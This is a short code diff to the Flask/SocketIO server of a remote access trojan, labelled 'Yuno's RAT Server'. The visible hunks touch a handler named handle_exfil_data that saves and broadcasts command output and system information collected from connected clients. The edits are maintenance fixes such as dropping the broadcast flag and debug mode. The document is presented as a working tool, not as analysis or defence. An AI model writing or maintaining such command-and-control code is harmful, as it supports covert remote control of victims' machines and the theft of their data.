@@ -4,8 +4,8 @@ import json
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify, url_for
 from flask_socketio import SocketIO, emit
-import base64
 import threading
+
 # Server settings
 HOST = "0.0.0.0"
 DATA_DIR = "rat_data"
@@ -61,13 +61,13 @@ def handle_exfil_data(data):
                     "output": client_data["output"],
                     "timestamp": timestamp
                 })
-            # Broadcast to web interface
+            # Broadcast to web interface (omit 'to' to broadcast to all clients)
             socketio.emit('command_output', {
                 "client_id": client_id,
                 "command": client_data["command"],
                 "output": client_data["output"],
                 "timestamp": timestamp
-            }, broadcast=True)
+            })
         else:
             # Save system info to disk
             filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
@@ -120,4 +120,4 @@ def view_file(filename):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access tool by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000)
